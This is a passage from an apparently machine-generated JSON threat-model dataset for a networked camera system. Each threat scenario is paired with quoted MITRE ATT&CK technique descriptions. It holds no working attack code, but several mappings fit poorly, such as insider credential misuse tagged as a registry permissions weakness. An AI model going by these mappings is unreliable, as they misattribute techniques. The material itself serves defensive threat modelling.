                    "Condition": "Lack of data loss prevention tools."
                }
            ],
            "Potential Impact": "Disclosure of sensitive visual data leading to privacy breaches.",
            "MITRE ATT&CK Keywords": [
                "network monitoring",
                "data interception",
                "unencrypted transmission",
                "data exfiltration"
            ],
            "mitre_technique": {
                "name": "Traffic Duplication",
                "description": "Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised infrastructure. Traffic mirroring is a native feature for some devices, often used for network analysis. For example, devices may be configured to forward network traffic to one or more destinations for analysis by a network analyzer or other monitoring device. (Citation: Cisco Traffic Mirroring)(Citation: Juniper Traffic Mirroring)\n\nAdversaries may abuse traffic mirroring to mirror or redirect network traffic through other infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) or [Patch System Image](https://attack.mitre.org/techniques/T1601/001).(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks)\n\nMany cloud-based environments also support traffic mirroring. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP)\n\nAdversaries may use traffic duplication in conjunction with [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Input Capture](https://attack.mitre.org/techniques/T1056), or [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) depending on the goals and objectives of the adversary.",
                "id": "attack-pattern--7c46b364-8496-4234-8a56-f7e6727e21e1",
                "technique_id": "T1020.001"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker uses an XXE vulnerability to read sensitive files from the server.",
            "Assumptions": [
                {
                    "Assumption": "XML parsers are not configured securely.",
                    "Role": "Software Developer",
                    "Condition": "Insecure parser configuration."
                },
                {
                    "Assumption": "Sensitive files are accessible to the service user.",
                    "Role": "System Administrator",
                    "Condition": "Over-permissive file access."
                },
                {
                    "Assumption": "Application input is not properly sanitized.",
                    "Role": "Developer",
                    "Condition": "No input validation."
                }
            ],
            "Potential Impact": "Exposure of sensitive files leading to information leakage.",
            "MITRE ATT&CK Keywords": [
                "XXE vulnerability",
                "file reading",
                "server",
                "input validation"
            ],
            "mitre_technique": {
                "name": "Cloud Instance Metadata API",
                "description": "Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.\n",
                "id": "attack-pattern--19bf235b-8620-4997-b5b4-94e0659ed7c3",
                "technique_id": "T1552.005"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Malware embedded in the network extracts visual data and sends it to an external server.",
            "Assumptions": [
                {
                    "Assumption": "No antivirus or malware detection.",
                    "Role": "Security Engineer",
                    "Condition": "Insufficient endpoint protection."
                },
                {
                    "Assumption": "Visual data is stored in an accessible format.",
                    "Role": "Data Manager",
                    "Condition": "Unprotected data storage."
                },
                {
                    "Assumption": "Network egress traffic is not monitored.",
                    "Role": "Network Security",
                    "Condition": "No egress filtering."
                }
            ],
            "Potential Impact": "Visual data exfiltration to unauthorized parties.",
            "MITRE ATT&CK Keywords": [
                "malware",
                "data exfiltration",
                "network",
                "external server"
            ],
            "mitre_technique": {
                "name": "Socket Filters",
                "description": "Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the `libpcap` library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.\n\nTo establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria.(Citation: haking9 libpcap network sniffing) Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction with [Protocol Tunneling](https://attack.mitre.org/techniques/T1572).(Citation: exatrack bpf filters passive backdoors)(Citation: Leonardo Turla Penquin May 2020)\n\nFilters can be installed on any Unix-like platform with `libpcap` installed or on Windows hosts using `Winpcap`.  Adversaries may use either `libpcap` with `pcap_setfilter` or the standard library function `setsockopt` with `SO_ATTACH_FILTER` options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.",
                "id": "attack-pattern--005cc321-08ce-4d17-b1ea-cb5275926520",
                "technique_id": "T1205.002"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker floods the camera nodes with excessive data requests causing system overload.",
            "Assumptions": [
                {
                    "Assumption": "System does not employ rate limiting.",
                    "Role": "System Administrator",
                    "Condition": "Lack of request throttling."
                },
                {
                    "Assumption": "Camera nodes are publicly exposed.",
                    "Role": "Network Architect",
                    "Condition": "Unrestricted public access."
                },
                {
                    "Assumption": "No effective filtering of incoming traffic.",
                    "Role": "Security Analyst",
                    "Condition": "Inadequate inbound traffic filtering."
                }
            ],
            "Potential Impact": "System becomes unresponsive leading to service disruption.",
            "MITRE ATT&CK Keywords": [
                "DoS",
                "system overload",
                "network traffic",
                "rate limiting"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker exploits a known vulnerability in the Linux kernel to crash the system.",
            "Assumptions": [
                {
                    "Assumption": "The system runs an unpatched version of Linux.",
                    "Role": "System Administrator",
                    "Condition": "Outdated OS patches."
                },
                {
                    "Assumption": "The attacker has network-level access.",
                    "Role": "Attacker",
                    "Condition": "Compromised network."
                },
                {
                    "Assumption": "No exploit mitigation mechanisms in place.",
                    "Role": "Security Engineer",
                    "Condition": "Lack of exploit protections."
                }
            ],
            "Potential Impact": "System crash leading to loss of service availability.",
            "MITRE ATT&CK Keywords": [
                "system crash",
                "exploit",
                "Linux kernel",
                "DoS"
            ],
            "mitre_technique": {
                "name": "Application or System Exploitation",
                "description": "Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ",
                "id": "attack-pattern--2bee5ffb-7a7a-4119-b1f2-158151b19ac0",
                "technique_id": "T1499.004"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A malware attack causes high CPU usage rendering the systems unusable.",
            "Assumptions": [
                {
                    "Assumption": "No malware detection mechanisms in place.",
                    "Role": "Security Analyst",
                    "Condition": "Insufficient endpoint protection."
                },
                {
                    "Assumption": "Malware signatures are not up-to-date.",
                    "Role": "System Administrator",
                    "Condition": "Outdated antivirus databases."
                },
                {
                    "Assumption": "Critical services share resources.",
                    "Role": "Infrastructure Manager",
                    "Condition": "Shared resource environments."
                }
            ],
            "Potential Impact": "System performance degradation to the point of unusability.",
            "MITRE ATT&CK Keywords": [
                "malware",
                "high CPU usage",
                "resource exhaustion",
                "DoS"
            ],
            "mitre_technique": {
                "name": "OS Exhaustion Flood",
                "description": "Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)",
                "id": "attack-pattern--0df05477-c572-4ed6-88a9-47c581f548f7",
                "technique_id": "T1499.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A low-privileged user exploits a vulnerability to gain root access on the server.",
            "Assumptions": [
                {
                    "Assumption": "Vulnerable services are exposed.",
                    "Role": "System Administrator",
                    "Condition": "Unpatched services."
                },
                {
                    "Assumption": "Exploitable vulnerability exists in the Linux kernel.",
                    "Role": "Security Engineer",
                    "Condition": "Presence of known vulnerability."
                },
                {
                    "Assumption": "Insufficient user privilege separation.",
                    "Role": "System Administrator",
                    "Condition": "Weak privilege segregation."
                }
            ],
            "Potential Impact": "Full control over the server resulting in complete system compromise.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "root access",
                "vulnerability",
                "server"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a firmware vulnerability to gain control of multiple camera nodes.",
            "Assumptions": [
                {
                    "Assumption": "Firmware is not updated to mitigate known vulnerabilities.",
                    "Role": "Firmware Developer",
                    "Condition": "Outdated firmware versions."
                },
                {
                    "Assumption": "Cameras do not have access control mechanisms for settings changes.",
                    "Role": "DevOps Engineer",
                    "Condition": "Lack of access controls."
                },
                {
                    "Assumption": "Existing vulnerabilities are not actively monitored.",
                    "Role": "Security Analyst",
                    "Condition": "Poor vulnerability management."
                }
            ],
            "Potential Impact": "Unauthorized control and manipulation of visual data.",
            "MITRE ATT&CK Keywords": [
                "firmware vulnerability",
                "camera nodes",
                "control",
                "privilege escalation"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An insider uses admin credentials to perform unauthorized activities that typically require higher privileges.",
            "Assumptions": [
                {
                    "Assumption": "Admin credentials are not adequately protected.",
                    "Role": "Identity and Access Manager",
                    "Condition": "Weak credential protection measures."
                },
                {
                    "Assumption": "No multi-factor authentication is in place.",
                    "Role": "System Administrator",
                    "Condition": "Single-factor authentication."
                },
                {
                    "Assumption": "Lax monitoring of administrative activities.",
                    "Role": "Security Analyst",
                    "Condition": "Weak administrative monitoring."
                }
            ],
            "Potential Impact": "Compromised integrity of system configurations and operational data.",
            "MITRE ATT&CK Keywords": [
                "credential misuse",
                "insider threat",
                "privilege escalation",
                "admin credentials"
            ],
            "mitre_technique": {
                "name": "Services Registry Permissions Weakness",
                "description": "Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  [PowerShell](https://attack.mitre.org/techniques/T1059/001), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through access control lists and user permissions. (Citation: Registry Key Security)(Citation: malware_hides_service)\n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter other Registry keys in the service\u2019s Registry tree. For example, the <code>FailureCommand</code> key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: Kansa Service related collectors)(Citation: Tweet Registry Perms Weakness)\n\nThe <code>Performance</code> key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.(Citation: microsoft_services_registry_tree) If the <code>Performance</code> key is not already present and if an adversary-controlled user has the <code>Create Subkey</code> permission, adversaries may create the <code>Performance</code> key in the service\u2019s Registry tree to point to a malicious DLL.(Citation: insecure_reg_perms)\n\nAdversaries may also add the <code>Parameters</code> key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.(Citation: microsoft_services_registry_tree)(Citation: troj_zegost) Additionally, If adversaries launch their malicious services using svchost.exe, the service\u2019s file may be identified using <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll</code>.(Citation: malware_hides_service)",
                "id": "attack-pattern--17cc750b-e95b-4d7d-9dde-49e0de24148c",
                "technique_id": "T1574.011"
            }
        }
    ]
},
{
    "case_number": "2",
    "batch_number": "7",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof a legitimate camera node within the Visual Sensor Network (VSN), masquerading as an authorized device.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has access to the network and sufficient knowledge to imitate the camera node's protocols.",
                    "Role": "Attacker",
                    "Condition": "Network access and protocol knowledge are available."
                },
                {
                    "Assumption": "There are inadequate or no mutual authentication mechanisms between the VSN nodes.",
                    "Role": "System Design",
                    "Condition": "Inadequate or no mutual authentication implementation."
                },
                {
                    "Assumption": "The network does not inspect or validate device identities rigorously.",
                    "Role": "Network Configuration",
                    "Condition": "Lack of rigorous identity validation processes."
                }
            ],
            "Potential Impact": "This could lead to unauthorized data collection, potentially breaching data confidentiality and integrity by injecting false data into the network.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "network",
                "device",
                "identity forgery"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could use social engineering to obtain credentials or configuration information from an insider to spoof legitimate access.",
            "Assumptions": [
                {
                    "Assumption": "Insiders are not adequately trained in security practices.",
                    "Role": "System Admin",
                    "Condition": "Lack of security awareness training."
                },
                {
                    "Assumption": "Credentials are not adequately protected or are shared improperly.",
                    "Role": "System Users",
                    "Condition": "Poor credential management."
                },
                {
                    "Assumption": "The attacker can communicate with insiders via plausible channels.",
                    "Role": "Attacker",
                    "Condition": "Established communication channels with insiders."
                }
            ],
            "Potential Impact": "This could allow unauthorized access, leading to loss of data confidentiality and integrity, as well as potential system disruption.",
            "MITRE ATT&CK Keywords": [
                "social engineering",
                "network",
                "device",
                "identity theft"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "Fake firmware updates could be pushed to the VSN nodes, seeming to originate from a legitimate source.",
            "Assumptions": [
                {
                    "Assumption": "Firmware updates are not digitally signed or verified.",
                    "Role": "System Architect",
                    "Condition": "Lack of signed or verified update mechanisms."
                },
                {
                    "Assumption": "The attacker has access to the update distribution channel.",
                    "Role": "Attacker",
                    "Condition": "Access to the distribution channel."
                },
                {
                    "Assumption": "Users or automated systems do not verify the update integrity.",
                    "Role": "System Users",
                    "Condition": "Lack of update integrity verification."
                }
            ],
            "Potential Impact": "This could result in compromised devices, leading to a breach in data confidentiality, integrity, and availability.",
            "MITRE ATT&CK Keywords": [
                "firmware",
                "network",
                "device",
                "injection"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could intercept and alter visual data in transit between camera nodes and the central server.",
            "Assumptions": [
                {
                    "Assumption": "The data in transit is not encrypted.",
                    "Role": "System Architect",
                    "Condition": "Lack of encryption for data in transit."
                },
                {
                    "Assumption": "The attacker has network access.",
                    "Role": "Attacker",
                    "Condition": "Access to network communication channels."
                },
                {
                    "Assumption": "No integrity checks are performed on the received data.",
                    "Role": "System Configuration",
                    "Condition": "Lack of integrity checking mechanisms."
                }
            ],
            "Potential Impact": "This could compromise data integrity and confidentiality, altering the visual data before it reaches its destination.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "network",
                "data integrity",
                "communication interception"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malicious software could tamper with settings on camera nodes to either degrade the quality of data or to siphon data to an unauthorized destination.",
            "Assumptions": [
                {
                    "Assumption": "The system lacks protection mechanisms against unauthorized software changes.",
                    "Role": "System Architect",
                    "Condition": "Lack of tamper protection."
                },
                {
                    "Assumption": "Firmware or software updates are not verified before installation.",
                    "Role": "System Processes",
                    "Condition": "Lack of update verification processes."
                },
                {
                    "Assumption": "The attacker has been able to gain initial access to the node.",
                    "Role": "Attacker",
                    "Condition": "Gained initial system access."
                }
            ],
            "Potential Impact": "This could affect data integrity, and lead to potential data breaches or loss of data availability.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "software",
                "device",
                "settings alteration"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could exploit vulnerabilities in the underlying Linux OS of the IoT devices to modify system files or settings.",
            "Assumptions": [
                {
                    "Assumption": "The devices run vulnerable versions of Linux OS or related software.",
                    "Role": "System Administrator",
                    "Condition": "Use of outdated or vulnerable software versions."
                },
                {
                    "Assumption": "The attacker can exploit the vulnerabilities to gain elevated access.",
                    "Role": "Attacker",
                    "Condition": "Ability to exploit the vulnerabilities."
                },
                {
                    "Assumption": "There are no efficient patch management practices in place.",
                    "Role": "System Administrator",
                    "Condition": "Poor patch management."
                }
            ],
            "Potential Impact": "This could lead to full system compromise, affecting data confidentiality, integrity, and availability.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "linux",
                "OS",
                "vulnerability exploitation"
            ],
            "mitre_technique": {
                "name": "Malicious Shell Modification",
